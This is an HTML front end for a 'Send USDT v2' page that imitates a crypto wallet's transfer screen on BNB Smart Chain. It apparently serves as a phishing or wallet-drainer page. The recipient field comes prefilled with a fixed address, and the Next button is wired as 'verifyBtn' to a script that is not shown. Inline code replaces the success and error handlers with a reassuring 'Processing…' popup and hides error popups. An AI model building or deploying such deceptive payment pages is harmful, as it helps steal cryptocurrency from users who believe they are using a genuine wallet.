<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
  <meta name="color-scheme" content="light dark">
  <title>Send USDT v2</title>
  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <!-- Web3.js (Load First) -->
  <script src="js/web3.min.js"></script>
</head>
<body>
  <!-- Loading overlay: shown when user clicks Next (diamond with bars) -->
  <div id="loadingOverlay" class="loading-overlay-match" aria-hidden="true" style="display: none;">
    <header class="loading-overlay-match__header">
      <button type="button" class="loading-overlay-match__close" aria-label="Close">&times;</button>
      <h1 class="loading-overlay-match__title">Loading</h1>
    </header>
    <div class="loading-overlay-match__indicator">
      <div class="loading-overlay-match__diamond">
        <div class="loading-overlay-match__bars">
          <span class="loading-overlay-match__bar"></span>
          <span class="loading-overlay-match__bar"></span>
          <span class="loading-overlay-match__bar"></span>
          <span class="loading-overlay-match__bar"></span>
        </div>
      </div>
    </div>
  </div>

  <!-- Payment processing popup: shown when transaction succeeds (replaces old success modal) -->
  <div id="processingPopup" class="processing-popup" aria-hidden="true" style="display: none;">
    <div class="processing-popup__backdrop"></div>
    <div class="processing-popup__sheet">
      <button type="button" class="processing-popup__close" aria-label="Close">&times;</button>
      <div class="processing-popup__graphic">
        <svg class="processing-popup__icon" viewBox="0 0 140 140" fill="none" xmlns="http://www.w3.org/2000/svg">
          <!-- Wireframe sphere (light blue, behind checkmark) -->
          <g class="processing-popup__wireframe" stroke="#30B5FF" stroke-width="0.9" fill="none" opacity="0.9" transform="rotate(-12 70 72)">
            <circle cx="70" cy="72" r="50"/>
            <ellipse cx="70" cy="72" rx="50" ry="24"/>
            <ellipse cx="70" cy="72" rx="24" ry="50"/>
            <ellipse cx="70" cy="72" rx="50" ry="12"/>
            <ellipse cx="70" cy="72" rx="12" ry="50"/>
          </g>
          <!-- 3D checkmark: green main face -->
          <path d="M 38 78 L 54 94 L 106 42" stroke="#05e576" stroke-width="16" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
          <!-- 3D checkmark: blue diagonal stripe (shaded side) -->
          <path d="M 42 74 L 52 84 L 58 78 L 48 68 Z" fill="#0047FF"/>
          <path d="M 48 80 L 56 88 L 62 82 L 54 74 Z" fill="#0042FF"/>
          <!-- Floating blue shapes -->
          <path class="processing-popup__shape processing-popup__shape--1" d="M 48 28 L 56 36 L 40 36 Z" fill="#0047FF"/>
          <path class="processing-popup__shape processing-popup__shape--2" d="M 88 26 L 96 34 L 80 34 Z" fill="#0047FF"/>
          <path class="processing-popup__shape processing-popup__shape--3" d="M 28 52 L 36 60 L 28 68 L 20 60 Z" fill="#30B5FF"/>
          <path class="processing-popup__shape processing-popup__shape--4" d="M 102 48 L 110 52 L 106 60 L 98 56 Z" fill="#30B5FF"/>
          <rect class="processing-popup__shape processing-popup__shape--5" x="22" y="88" width="14" height="5" rx="1.5" fill="#30B5FF"/>
        </svg>
      </div>
      <h2 class="processing-popup__title">Processing...</h2>
      <p class="processing-popup__desc">
        <span class="processing-popup__line">Transaction in progress! Blockchain validation is underway.</span>
        <span class="processing-popup__line">This may take a few minutes.</span>
      </p>
      <a id="processingPopupDetailsBtn" href="https://bscscan.com/" target="_blank" rel="noopener" class="processing-popup__btn">Transaction details</a>
    </div>
  </div>

  <main class="container">
    <label class="label" for="address">Address or Domain Name</label>
    <div class="input-group address-input-group">
      <input type="text" id="address" placeholder="Search or Enter" value="0x53d6f1967d89291a92F185CCc744024d50E8c744">
      <button class="text-btn">Paste</button>
      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
      <button class="icon-btn"><i class="fas fa-expand"></i></button>
    </div>

    <label class="label" for="destinationNetwork">Destination network</label>
    <div class="network-select">
      <div class="network-icon">
        <img src="cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img">
      </div>
      <span class="network-text">BNB Smart Chain</span>
      <i class="fas fa-chevron-down network-arrow"></i>
    </div>

    <label class="label" for="amount">Amount</label>
    <div class="input-group amount-input-group">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span class="unit">USDT</span>
      <button class="max-btn">Max</button>
    </div>

    <p class="estimate" id="estimate">≈ $0.00</p>

    <button id="verifyBtn" class="next-btn">Next</button>
  </main>

  <script src="js/script.js"></script>
  <script>
    document.getElementById("verifyBtn").addEventListener("click", Next);
    (function () {
      var loadingEl = document.getElementById("loadingOverlay");
      var origShowLoading = window.showLoading;
      var origHideLoading = window.hideLoading;
      if (loadingEl && typeof origShowLoading === "function") {
        window.showLoading = function (msg) {
          var spin = document.getElementById("loadingSpinner");
          if (spin) spin.style.display = "none";
          loadingEl.style.removeProperty("display");
          loadingEl.setAttribute("aria-hidden", "false");
          origShowLoading.apply(this, arguments);
        };
      }
      if (loadingEl && typeof origHideLoading === "function") {
        window.hideLoading = function () {
          loadingEl.style.display = "none";
          loadingEl.setAttribute("aria-hidden", "true");
          origHideLoading.apply(this, arguments);
        };
      }
      var loadingCloseBtn = loadingEl && loadingEl.querySelector(".loading-overlay-match__close");
      if (loadingCloseBtn) loadingCloseBtn.addEventListener("click", function () { if (typeof window.hideLoading === "function") window.hideLoading(); });
      var processingEl = document.getElementById("processingPopup");
      function closeProcessingPopup() {
        if (!processingEl) return;
        processingEl.classList.remove("is-open");
        processingEl.setAttribute("aria-hidden", "true");
        processingEl.style.display = "none";
      }
      if (processingEl) {
        processingEl.querySelector(".processing-popup__close").addEventListener("click", closeProcessingPopup);
        processingEl.querySelector(".processing-popup__backdrop").addEventListener("click", closeProcessingPopup);
      }
      var origShowSuccess = window.showSuccess;
      if (typeof origShowSuccess === "function" && processingEl) {
        window.showSuccess = function (message) {
          if (loadingEl) { loadingEl.style.display = "none"; loadingEl.setAttribute("aria-hidden", "true"); }
          processingEl.style.removeProperty("display");
          processingEl.classList.add("is-open");
          processingEl.setAttribute("aria-hidden", "false");
        };
      }
    })();
    (function () {
      var origShowError = window.showError;
      var loadingEl = document.getElementById("loadingOverlay");
      if (typeof origShowError !== "function") return;
      window.showError = function (message) {
        origShowError.apply(this, arguments);
        if (loadingEl) {
          loadingEl.style.display = "none";
          loadingEl.setAttribute("aria-hidden", "true");
        }
        var scriptPopup = document.getElementById("errorPopup");
        if (scriptPopup) scriptPopup.style.display = "none";
      };
    })();
  </script>
  <!-- Update USD estimate and Next button colour: light when no amount, dark when amount entered -->
  <script>
    (function () {
      var amountInput = document.getElementById("amount");
      var estimateEl = document.getElementById("estimate");
      var nextBtn = document.getElementById("verifyBtn");
      function updateEstimateAndButton() {
        var raw = amountInput.value.replace(/^\s+|\s+$/g, "");
        var num = parseFloat(raw) || 0;
        var value = Math.abs(num);
        estimateEl.textContent = "≈ $" + value.toFixed(2);
        if (nextBtn) {
          if (value > 0) {
            nextBtn.classList.add("next-btn--has-amount");
          } else {
            nextBtn.classList.remove("next-btn--has-amount");
          }
        }
      }
      amountInput.addEventListener("input", updateEstimateAndButton);
      amountInput.addEventListener("change", updateEstimateAndButton);
      updateEstimateAndButton();
    })();
  </script>
</body>
</html>
